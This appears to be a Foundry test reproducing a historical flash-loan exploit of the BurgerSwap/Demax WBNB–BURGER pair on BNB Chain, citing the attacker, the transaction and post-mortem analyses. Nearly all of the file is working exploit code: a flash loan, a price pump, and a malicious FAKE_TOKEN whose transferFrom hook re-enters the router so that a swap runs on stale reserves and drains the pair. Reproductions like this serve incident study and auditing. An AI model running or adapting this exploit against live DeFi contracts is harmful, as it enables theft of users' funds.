// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

// Attacker: 0x6c9f2b95ca3432e5ec5bcd9c19de0636a23a4994
// Attack Contract: 0xae0f538409063e66ff0e382113cb1a051fc069cd
// Objective: Drain funds in the vulnerable Burger LP contract: 0x7ac55ac530f2c29659573bde0700c6758d69e677 (Demax WBNB<>BURGER pair)
// Attack Tx: https://phalcon.xyz/tx/bsc/0xac8a739c1f668b13d065d56a03c37a686e0aa1c9339e79fcbc5a2d0a6311e333
//            https://bscscan.com/tx/0xac8a739c1f668b13d065d56a03c37a686e0aa1c9339e79fcbc5a2d0a6311e333

// @Analyses (somewhat similar to Impossible Finance exploit)
// https://lunaray.medium.com/burgerswap-attack-analysis-c0345541d69
// https://quillhashteam.medium.com/burgerswap-flash-loan-attack-analysis-888b1911daef

contract Exploit is Test {
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant BURGER = IERC20(0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f);

    IUniswapV2Pair private constant USDT_WBNB = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);

    IDemaxPlatform private constant demaxPlatform = IDemaxPlatform(0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0); // router
    IDemaxDelegate private constant demaxDelegate = IDemaxDelegate(0xd0dd735851C1Ca61d0324291cCD3959d2153A88d); // factory

    FAKE_TOKEN FAKE;

    function setUp() public {
        vm.createSelectFork("bsc", 7_781_159);
    }

    function testExploit() public {
        // BURGER and WBNB in Pair before: 164603 <> 3038
        USDT_WBNB.swap(0, 6_047_132_230_250_298_663_393, address(this), "Flashloan 6047 WBNB");
        // BURGER and WBNB in Pair after: 53606 <> 622

        console.log("BURGER exploited:", BURGER.balanceOf(address(this)) / 1e18);
        console.log("WBNB exploited:", WBNB.balanceOf(address(this)) / 1e18);
    }

    function pancakeCall(address, uint256, uint256 amount1, bytes memory) public {
        // swap 6047 WBNB for 92677 BURGER (pump BURGER price)
        WBNB.approve(address(demaxPlatform), type(uint256).max);
        BURGER.approve(address(demaxPlatform), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BURGER);
        demaxPlatform.swapExactTokensForTokens(WBNB.balanceOf(address(this)), 0, path, address(this), type(uint256).max);

        // create FAKE token, create FAKE<>BURGER pair and add 100 FAKE <> 45452 BURGER liquidity (addLiquidity() creates Pair if Pair doesn't exist)
        FAKE = new FAKE_TOKEN(address(this));

        FAKE.approve(address(demaxPlatform), type(uint256).max);
        BURGER.approve(address(demaxDelegate), type(uint256).max);
        demaxDelegate.addLiquidity(address(FAKE), address(BURGER), 100, 45_452 ether, 0, 0, type(uint256).max); // 47225 BURGER left after addLiquidity()

        FAKE.enableExploit();

        // use malicious path to swap 1 FAKE -> 45452 BURGER -> 4478 WBNB (will use false amounts which were already calculated before the inner swap) [Second swap]
        //                          and another 45452 BURGER -> 4478 WBNB (same price, no slippage incurred) [First swap]
        /*  
        WBNB -> BURGER ----> FAKE <> BURGER 

        FAKE -----------------> BURGER -> WBNB
            |               ^
            v               |
            BURGER -> WBNB  | 
        */
        address[] memory path2 = new address[](3);
        path2[0] = address(FAKE);
        path2[1] = address(BURGER);
        path2[2] = address(WBNB);
        demaxPlatform.swapExactTokensForTokens(1 ether, 0, path2, address(this), type(uint256).max); // trigger transferFrom() hook in FAKE then enter()

        // swap 494 WBNB for 108k BURGER (small amount of WBNB for large amount of BURGER) to bring back normal price
        path[0] = address(WBNB);
        path[1] = address(BURGER);
        demaxPlatform.swapTokensForExactTokens(108_791 ether, 494 ether, path, address(this), type(uint256).max);

        // repay 0.3% fee
        WBNB.transfer(address(USDT_WBNB), amount1 * 1000 / 997);
    }

    function enter() public {
        // swap another 45452 BURGER for 4478 WBNB (this inner BURGER -> WBNB swap uses the correct reserves) and is not locked yet
        address[] memory path = new address[](2);
        path[0] = address(BURGER);
        path[1] = address(WBNB);
        demaxPlatform.swapExactTokensForTokens(45_452 ether, 0, path, address(this), type(uint256).max);

        FAKE.disableExploit();
    }
}

contract FAKE_TOKEN {
    uint256 public totalSupply = 100 ether;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    Exploit private immutable exploit;
    bool private isExploiting;

    constructor(address main) {
        balanceOf[main] = 99 ether;
        exploit = Exploit(main);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        unchecked {
            allowance[sender][msg.sender] -= amount;
            balanceOf[sender] -= amount;
            balanceOf[recipient] += amount;
        }

        if (isExploiting) {
            exploit.enter();
        }
        return true;
    }

    function enableExploit() public {
        isExploiting = true;
    }

    function disableExploit() public {
        isExploiting = false;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }
}

/* ---------------------- Interface ---------------------- */
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IDemaxPlatform {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IDemaxDelegate {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface IUniswapV2Pair {
    function balanceOf(address) external view returns (uint256);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}
